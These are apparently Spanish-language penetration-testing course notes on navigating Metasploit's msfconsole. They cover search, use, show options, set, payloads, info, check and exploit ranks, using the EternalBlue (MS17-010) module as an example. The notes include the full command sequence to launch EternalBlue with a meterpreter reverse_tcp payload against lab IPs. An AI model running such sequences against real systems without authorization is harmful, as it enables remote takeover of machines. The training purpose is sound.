# 🖥️ msfconsole — Navegación y Comandos Esenciales
**Path:** Jr Penetration Tester  
**Módulo:** Metasploit — Tarea 3  
**Tema:** La consola de Metasploit por dentro

---

## Iniciando msfconsole

```bash
msfconsole
```

Al iniciarse, muestra una pantalla de bienvenida con el conteo de módulos disponibles:

```
=[ metasploit v6.0                              ]
+ -- --=[ 2048 exploits - 1105 auxiliary - 344 post  ]
+ -- --=[ 562 payloads - 45 encoders - 10 nops       ]
+ -- --=[ 7 evasion                                  ]

msf6 >
```

El prompt cambia a `msf6 >` — ahí sabes que estás dentro de Metasploit. La versión puede ser msf5 o msf6 dependiendo de la instalación.

---

## Comandos básicos de la consola

### Comandos de Linux dentro de msfconsole

msfconsole acepta la mayoría de comandos de Linux directamente:

```bash
msf6 > ls              # listar archivos del directorio actual
msf6 > ping -c 1 8.8.8.8   # hacer ping (el -c 1 limita a un solo ping)
msf6 > clear           # limpiar la pantalla
msf6 > history         # ver el historial de comandos usados
```

![[msfconsole-linux-cmds-1.png]]

> [!warning] Limitación importante
> msfconsole **no soporta redirección de salida** ni pipes del sistema. Esto no funciona:
> ```bash
> msf6 > help > help.txt    # Error: No such command
> ```
> Si necesitas guardar output, tendrás que hacerlo desde fuera de msfconsole o usar el comando `spool` de Metasploit.

### Autocompletado con Tab

msfconsole tiene autocompletado completo con la tecla `Tab`. Si empiezas a escribir un comando y presionas Tab, lo completa o muestra las opciones disponibles:

```bash
msf6 > he[Tab]    →  help
msf6 > use ex[Tab]  →  muestra todos los módulos que empiezan con "ex"
```

En módulos largos, el Tab es esencial para no escribir rutas completas a mano.

### help

```bash
msf6 > help          # muestra todos los comandos disponibles
msf6 > help set      # muestra ayuda específica para el comando "set"
```

---

## El sistema de contextos — cómo funciona msfconsole

Este es el concepto más importante de esta tarea para entender bien.

msfconsole funciona por **contextos**. Cuando seleccionas un módulo con `use`, entras en el contexto de ese módulo — el prompt cambia para indicarlo:

```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue

[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp

msf6 exploit(windows/smb/ms17_010_eternalblue) >
#    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
#    El prompt ahora muestra en qué módulo estás
```

Mientras estés en ese contexto:
- Los parámetros que configures (`set RHOSTS`, `set LPORT`) pertenecen a ese módulo
- Los comandos de Linux siguen funcionando igual
- `show options` muestra las opciones de ese módulo específico

> [!warning] Los parámetros no se transfieren entre módulos
> Si estás en EternalBlue y configuras `RHOSTS 10.10.10.40`, luego sales y usas otro módulo, ese RHOSTS **no se lleva contigo**. Cada módulo tiene su propio contexto aislado.
>
> Excepción: si usas `set -g` (global) el parámetro se aplica a todos los módulos de la sesión actual.
> ```bash
> msf6 > set -g LHOST 10.10.14.5    # aplica a todos los módulos
> ```

### Salir del contexto — comando `back`

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > back
msf6 >
```

`back` te regresa al prompt raíz sin cerrar Metasploit ni perder las sesiones activas.

---

## Flujo completo para usar un módulo

Usando EternalBlue (MS17-010) como ejemplo:

```bash
# 1. Seleccionar el módulo
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# También puedes usar el número del resultado de search
msf6 > use 2    # si el número 2 fue EternalBlue en la búsqueda

# 2. Ver qué parámetros necesita
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# 3. Configurar los parámetros requeridos
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.40
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.14.5

# 4. Lanzar
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
# o también:
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

---

## show options — entendiendo los parámetros

`show options` es el comando que más usarás dentro de un módulo. Muestra dos tablas: opciones del exploit y opciones del payload.

![[show-options-eternalblue-1.png]]

```
Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Required  Description
   ----           --------  -----------
   RHOSTS         yes       IP del objetivo (o rango, o archivo)
   RPORT          yes       Puerto del objetivo (default: 445 para SMB)
   SMBDomain      no        Dominio Windows (opcional)
   SMBPass        no        Contraseña SMB (opcional)
   SMBUser        no        Usuario SMB (opcional)
   VERIFY_ARCH    yes       Verifica arquitectura del objetivo
   VERIFY_TARGET  yes       Verifica OS del objetivo

Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Required  Description
   ----      --------  -----------
   EXITFUNC  yes       Técnica de salida del proceso
   LHOST     yes       IP del atacante (donde escucha la reverse shell)
   LPORT     yes       Puerto del atacante (default: 4444)
```

### Los parámetros más comunes

| Parámetro | Significado | Cuándo se usa |
|---|---|---|
| `RHOSTS` | IP del objetivo (Remote Hosts) | Exploits, scanners |
| `RPORT` | Puerto del objetivo (Remote Port) | Exploits, scanners |
| `LHOST` | Tu IP (Local Host) — donde llegará la reverse shell | Payloads de reverse shell |
| `LPORT` | Tu puerto de escucha (Local Port) | Payloads de reverse shell |
| `SESSION` | ID de sesión activa | Módulos post-explotación |
| `PAYLOAD` | Qué payload usar con el exploit | Exploits |

> [!info] RHOSTS acepta múltiples formatos
> ```bash
> set RHOSTS 10.10.10.40              # una IP específica
> set RHOSTS 10.10.10.0/24            # rango CIDR (toda la subred)
> set RHOSTS 10.10.10.1-50            # rango de IPs
> set RHOSTS file:/ruta/targets.txt   # lista de IPs desde un archivo
> ```

### Módulos post — usan SESSION en vez de RHOSTS

Los módulos de post-explotación no apuntan a una IP — se ejecutan sobre una **sesión ya establecida**:

![[show-options-post-1.png]]

```
Module options (post/windows/gather/enum_domain_users):

   Name     Required  Description
   ----     --------  -----------
   SESSION  yes       ID de la sesión activa donde ejecutar el módulo
   HOST     no        Host específico
   USER     no        Usuario objetivo
```

---

## show payloads — elegir el payload adecuado

Dentro del contexto de un exploit, este comando lista todos los payloads **compatibles** con ese exploit específico:

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads
```

![[show-payloads-1.png]]

```
Compatible Payloads
===================

  #  Name                                    Rank    Description
  -  ----                                    ----    -----------
  0  generic/custom                          manual  Custom Payload
  1  generic/shell_bind_tcp                  manual  Generic Shell, Bind TCP
  2  generic/shell_reverse_tcp               manual  Generic Shell, Reverse TCP
  3  windows/x64/exec                        manual  Execute Command
  4  windows/x64/loadlibrary                 manual  LoadLibrary Path
  5  windows/x64/messagebox                  manual  Windows MessageBox
  6  windows/x64/meterpreter/bind_ipv6_tcp   manual  Meterpreter (Reflective)
  7  windows/x64/meterpreter/reverse_tcp     manual  Meterpreter Reverse TCP
  ...
```

Para elegir uno:

```bash
# Por nombre completo
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Por número del listado
set PAYLOAD 7
```

> [!tip] Bind vs Reverse — diferencia rápida
> ```
> shell_bind_tcp    → El SERVIDOR abre el puerto y espera que el atacante conecte
>                     (útil si el atacante tiene firewall, raro en la práctica)
>
> shell_reverse_tcp → El SERVIDOR conecta hacia el atacante
>                     (lo más común — evita firewalls del servidor)
> ```

---

## El comando `info`

Muestra información completa de cualquier módulo: descripción, autor, referencias, opciones y espacio disponible para el payload.

```bash
# Dentro del contexto del módulo
msf6 exploit(windows/smb/ms17_010_eternalblue) > info

# Desde el prompt raíz (sin entrar al módulo)
msf6 > info exploit/windows/smb/ms17_010_eternalblue
```

![[info-eternalblue-1.png]]

El output de `info` incluye:

```
Name:        MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
Module:      exploit/windows/smb/ms17_010_eternalblue
Platform:    Windows
Privileged:  Yes          ← el exploit da privilegios de SYSTEM
Rank:        Average
Disclosed:   2017-03-14
Provided by: Sean Dillon, Dylan Davis, Equation Group, Shadow Brokers...

Available targets:
  0  Windows 7 and Server 2008 R2 (x64) All Service Packs

Payload Space: 2000       ← cuántos bytes tiene disponibles para el payload
```

> [!info] Historia de EternalBlue
> EternalBlue explota una vulnerabilidad en SMBv1 (Server Message Block), el protocolo que Windows usa para compartir archivos e impresoras en red. Fue desarrollado originalmente por la NSA (Agencia de Seguridad Nacional de EE.UU.) bajo el nombre interno "EternalBlue". El grupo Shadow Brokers filtró las herramientas de la NSA en abril de 2017, y en mayo de ese mismo año el ransomware **WannaCry** las usó para infectar más de 200,000 sistemas en 150 países. Es uno de los exploits más conocidos de la historia.

---

## El comando `search` — encontrar módulos

`search` es el comando que más usarás para encontrar módulos relevantes. Busca en toda la base de datos de Metasploit.

```bash
# Buscar por nombre o CVE
msf6 > search ms17-010
msf6 > search eternalblue
msf6 > search cve:2017-0144

# Filtrar por tipo de módulo
msf6 > search type:auxiliary telnet
msf6 > search type:exploit platform:windows smb

# Buscar por nombre de software
msf6 > search apache
msf6 > search wordpress
```

![[search-ms17-010-1.png]]

### Leer el output de search

```
#  Name                                    Disclosure Date  Rank     Check
-  ----                                    ---------------  ----     -----
0  auxiliary/admin/smb/ms17_010_command    2017-03-14       normal   No
1  auxiliary/scanner/smb/smb_ms17_010      2017-03-14       normal   No
2  exploit/windows/smb/ms17_010_eternalblue 2017-03-14     average  Yes
3  exploit/windows/smb/ms17_010_psexec     2017-03-14       normal   Yes
4  exploit/windows/smb/smb_doublepulsar_rce 2017-04-14      great    Yes
```

La columna **Check** indica si el módulo tiene función de verificación (`check`) — puede probar si el objetivo es vulnerable **sin lanzar el exploit**. Muy útil para no "disparar" en producción.

```bash
# Verificar si el objetivo es vulnerable sin explotar
msf6 exploit(windows/smb/ms17_010_eternalblue) > check
```

---

## Ranking de exploits — qué tan confiable es cada uno

Cada módulo tiene un **Rank** que indica su fiabilidad. Es importante entenderlo para saber qué esperar:

| Rank | Qué significa |
|---|---|
| **Excellent** | Nunca crashea el servicio. Típico en SQLi, CMDi, LFI. El más seguro de usar. |
| **Great** | Detecta automáticamente el target correcto antes de explotar. |
| **Good** | Tiene un target por defecto que funciona en los casos más comunes. |
| **Normal** | Confiable pero depende de una versión específica, no autodetecta. |
| **Average** | Generalmente poco confiable o difícil de explotar. |
| **Low** | Tasa de éxito menor al 50% en plataformas comunes. |
| **Manual** | Inestable, puede causar DoS. Requiere configuración manual específica. |

> [!danger] Exploits de bajo ranking en producción
> Un exploit de ranking **Low** o **Manual** puede **crashear el sistema objetivo**. En un engagement real con un cliente, crashear un servidor de producción es un incidente grave. Siempre revisa el rank antes de lanzar, y consulta con el cliente si los sistemas son críticos.

---

## Referencia rápida — comandos de msfconsole

```
┌─────────────────────────────────────────────────────────────────┐
│  COMANDOS ESENCIALES DE MSFCONSOLE                              │
├──────────────────────┬──────────────────────────────────────────┤
│  help                │ Lista todos los comandos                 │
│  search <término>    │ Buscar módulos por nombre, CVE, tipo     │
│  use <módulo>        │ Entrar al contexto de un módulo          │
│  show options        │ Ver parámetros del módulo actual         │
│  show payloads       │ Ver payloads compatibles con el exploit  │
│  set <PARAM> <valor> │ Configurar un parámetro                  │
│  set -g <PARAM>      │ Configurar parámetro global              │
│  unset <PARAM>       │ Quitar el valor de un parámetro          │
│  run / exploit       │ Lanzar el módulo                         │
│  check               │ Verificar si el objetivo es vulnerable   │
│  info                │ Ver información detallada del módulo     │
│  back                │ Salir del contexto actual                │
│  history             │ Ver historial de comandos                │
│  sessions            │ Ver sesiones activas                     │
│  sessions -i <id>    │ Conectar a una sesión activa             │
│  exit / quit         │ Cerrar msfconsole                        │
└──────────────────────┴──────────────────────────────────────────┘
```

> [!success] Flujo de trabajo en msfconsole
> El 90% del trabajo en Metasploit sigue siempre la misma secuencia:
> `search` → `use` → `show options` → `set` parámetros → `show payloads` → `set PAYLOAD` → `run`
> Una vez que lo interiorizas, el resto es solo saber qué módulos existen y cuándo usarlos.
